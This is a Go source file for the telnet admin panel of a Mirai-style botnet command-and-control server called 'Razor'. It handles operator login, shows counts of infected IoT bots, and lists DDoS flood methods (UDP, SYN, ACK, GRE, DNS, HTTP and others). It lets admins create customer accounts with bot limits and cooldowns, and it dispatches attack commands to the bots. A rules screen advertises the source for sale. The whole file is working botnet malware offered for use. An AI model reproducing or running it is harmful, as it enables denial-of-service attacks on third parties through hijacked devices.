package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

// This is gift from UN5T48L3. Enjoy hoomies!

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get username
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\033[01;31mCrime Scene\033[01;31m | Do Not Cross!\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[01;31mWho are you\033[\033[01;37m: \033[01;37m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[01;31mPassword\033[\033[01;37m: \033[01;37m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }
    //Attempt  Login
    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[01;36mChecking your informations \033[01;37mPlease wait... \033[01;37m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }
    this.conn.Write([]byte("\r\n"))

    //if credentials are incorrect output error and close session
    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
        this.conn.Write([]byte("\r\033[00;31mFUCK YOU! \033[01;37mYour ip address sent to the owner. Wait for they fuck you up!\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
    //Header display bots connected, source name, client name
    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; [%d] ioT Devices | Connected as: %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
    this.conn.Write([]byte("\033[2J\033[1H")) //display main header
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[31m                                                           :                        \r\n"))
    this.conn.Write([]byte("\033[31m                                                          t#,                       \r\n"))
    this.conn.Write([]byte("\033[31m       j.                                                ;##W.   j.                 \r\n"))
    this.conn.Write([]byte("\033[31m       EW,                   ..       UN5T48L3 Security :#L:WE   EW,                \r\n"))
    this.conn.Write([]byte("\033[31m       E##j                 ;W,      ,##############Wf..KG  ,#D  E##j               \r\n"))
    this.conn.Write([]byte("\033[31m       E###D.              j##,       ........jW##Wt   EE    ;#f E###D.             \r\n"))
    this.conn.Write([]byte("\033[31m       E#jG#W;            G###,             tW##Kt    f#.     t#iE#jG#W;            \r\n"))
    this.conn.Write([]byte("\033[31m       E#t t##f         :E####,           tW##E;      :#G     GK E#t t##f           \r\n"))
    this.conn.Write([]byte("\033[31m       E#t  :K#E:      ;W#DG##,         tW##E;         ;#L   LW. E#t  :K#E:         \r\n"))
    this.conn.Write([]byte("\033[31m       E#KDDDD###i    j###DW##,      .fW##D,            t#f f#:  E#KDDDD###i        \r\n"))
    this.conn.Write([]byte("\033[31m       E#f,t#Wi,,,   G##i,,G##,    .f###D,               f#D#;   E#f,t#Wi,,,        \r\n"))
    this.conn.Write([]byte("\033[31m       E#t  ;#W:   :K#K:   L##,  .f####Gfffffffffff;      G#t    E#t  ;#W:          \r\n"))
    this.conn.Write([]byte("\033[31m       DWi   ,KK: ;##D.    L##, .fLLLLLLLLLLLLLLLLLi       t     DWi   ,KK:         \r\n"))
    this.conn.Write([]byte("\033[31m                  ,,,      .,,                                         \r\n"))             
    this.conn.Write([]byte("\033[31m                                                                           \r\n"))
    this.conn.Write([]byte("\033[36m                       Type HELP or METHODS to get started      \033[01;31m\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\r\n"))

    
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[01;37m[\033[01;37m" + username + "\033[01;37m@\033[01;37mRazor \033[01;37m~\033[01;37m]\033[01;37m# \033[01;37m"))
        cmd, err := this.ReadLine(false)
        
        if cmd == "" {
            continue
        }
        
        if err != nil || cmd == "c" || cmd == "cls" || cmd == "clear" { // clear screen 
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                  \r\n"))
            this.conn.Write([]byte("\033[37m    I'm nobody               \r\n"))
            this.conn.Write([]byte("\033[37m      I'm a tramp, a bum, a hobo...\r\n"))
            this.conn.Write([]byte("\033[37m     I'm a boxcar and a jug of wine!\r\n"))
            this.conn.Write([]byte("\033[1;31m        AND A STRAIGHT RAZOR...\r\n"))
            this.conn.Write([]byte("\033[37m     if you get too close to me! ”\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
        }
        if cmd == "help" || cmd == "HELP" || cmd == "?" { // display help menu
            this.conn.Write([]byte("\033[01;37m ╔-════════════════════════════════════-╗   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;36m METHODS : \033[01;37mShows attack commands     \033[01;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;36m ADMIN : \033[01;37mShows admin commands        \033[01;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;36m BOTS : \033[01;37mShows bots and archs         \033[01;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;36m RULES : \033[01;37mRead if you dont get banned \033[01;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;36m CLS : \033[01;37mClears the terminal           \033[01;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;36m LOGOUT : \033[01;37mExits from the terminal    \033[01;37m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;37m ╚-════════════════════════════════════-╝ \033[0m \r\n"))
            continue
        }
        
        
        if cmd == "METHODS" || cmd == "methods" { // display methods and how to send an attack
            this.conn.Write([]byte("\033[01;36m     -> | Razor Botnet Attack Methods | <- \r\n"))
            this.conn.Write([]byte("\033[01;31m ╔-════════════════════════════════════════════-╗   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ \033[01;37m.udp [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ \033[01;37m.vse [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ \033[01;37m.dns [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ \033[01;37m.syn [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ \033[01;37m.ack [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ \033[01;37m.stomp [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m              ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ \033[01;37m.greip [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m              ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ \033[01;37m.greeth [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m             ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ \033[01;37m.udpplain [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m           ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;31m ║ \033[01;37m.http [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] domain=[\033[01;37mDOMAIN\033[01;37m] conns=5000\033[01;31m ║   \033[0m \r\n"))            
            this.conn.Write([]byte("\033[01;31m ╚-════════════════════════════════════════════-╝   \033[0m \r\n"))
            continue
        }

        if userInfo.admin == 1 && cmd == "admin" {
            this.conn.Write([]byte("\033[01;37m ╔-═════════════════════════════════-╗\r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;31mADDBASIC -> \033[01;37mAdd Basic Client Menu \033[01;37m║\r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;31mADDADMIN -> \033[01;37mAdd Admin Client Menu \033[01;37m║ \r\n"))
            this.conn.Write([]byte("\033[01;37m ║ \033[01;31mREMOVEUSER -> \033[01;37mRemove User Menu    \033[01;37m║ \r\n"))
            this.conn.Write([]byte("\033[01;37m ╚-═════════════════════════════════-╝  \r\n"))
            continue
        }
        if err != nil || cmd == "RULES" || cmd == "rules" {
        botCount = clientList.Count()
            this.conn.Write([]byte(fmt.Sprintf("\033[01;37m ═══════════════════════════════  \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;31mHey \033[01;37m" + username + " !          \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;31mDon't spam! Don't share! Don't play with me!\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;31mDon't attack to goverment ips.\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;31mIf you wanna buy this source build, dm me. \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;31mVersion: \033[01;37mv0.1                        \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;31mContact Discord: \033[01;37mUN5T48L3       \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[01;37m ═══════════════════════════════  \r\n")))
            continue
        }
        if err != nil || cmd == "logout" || cmd == "LOGOUT" {
            return
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "addbasic" {
            this.conn.Write([]byte("\033[0mUsername:\033[01;37m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mPassword:\033[01;37m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mBotcount\033[01;37m(\033[0m-1 for access to all\033[01;37m)\033[0m:\033[01;37m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0mAttack Duration\033[01;37m(\033[0m-1 for none\033[01;37m)\033[0m:\033[01;37m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0mCooldown\033[01;37m(\033[0m0 for none\033[01;37m)\033[0m:\033[01;37m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[01;37m" + new_un + "\r\n\033[0m- Password - \033[01;37m" + new_pw + "\r\n\033[0m- Bots - \033[01;37m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[01;37m" + duration_str + "\r\n\033[0m- Cooldown - \033[01;37m" + cooldown_str + "   \r\n\033[0mContinue? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "removeuser" {
            this.conn.Write([]byte("\033[01;37mUsername: \033[0;35m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \033[01;37mAre You Sure You Want To Remove \033[01;37m" + rm_un + "?\033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;31mUnable to remove users\r\n")))
            } else {
                this.conn.Write([]byte("\033[01;32mUser Successfully Removed!\r\n"))
            }
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "addadmin" {
            this.conn.Write([]byte("\033[0mUsername:\033[01;37m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mPassword:\033[01;37m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mBotcount\033[01;37m(\033[0m-1 for access to all\033[01;37m)\033[0m:\033[01;37m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0mAttack Duration\033[01;37m(\033[0m-1 for none\033[01;37m)\033[0m:\033[01;37m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0mCooldown\033[01;37m(\033[0m0 for none\033[01;37m)\033[0m:\033[01;37m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[01;37m" + new_un + "\r\n\033[0m- Password - \033[01;37m" + new_pw + "\r\n\033[0m- Bots - \033[01;37m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[01;37m" + duration_str + "\r\n\033[0m- Cooldown - \033[01;37m" + cooldown_str + "   \r\n\033[0mContinue? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }

        if cmd == "bots" || cmd == "BOTS" {
        botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m%s: \x1b[0;36m%d\033[0m\r\n\033[0m", k, v)))
            }
            this.conn.Write([]byte(fmt.Sprintf("\033[01;37mTotal Bots: \033[01;31m[\033[01;31m%d\033[01;31m]\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                    var YotCount int
                    if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                        YotCount = userInfo.maxBots
                    } else {
                        YotCount = clientList.Count()
                    }
                    this.conn.Write([]byte(fmt.Sprintf("\033[0;91m[+] Command sent to \033[0;37m%d \033[0;91mbots\r\n", YotCount)))
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\033' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}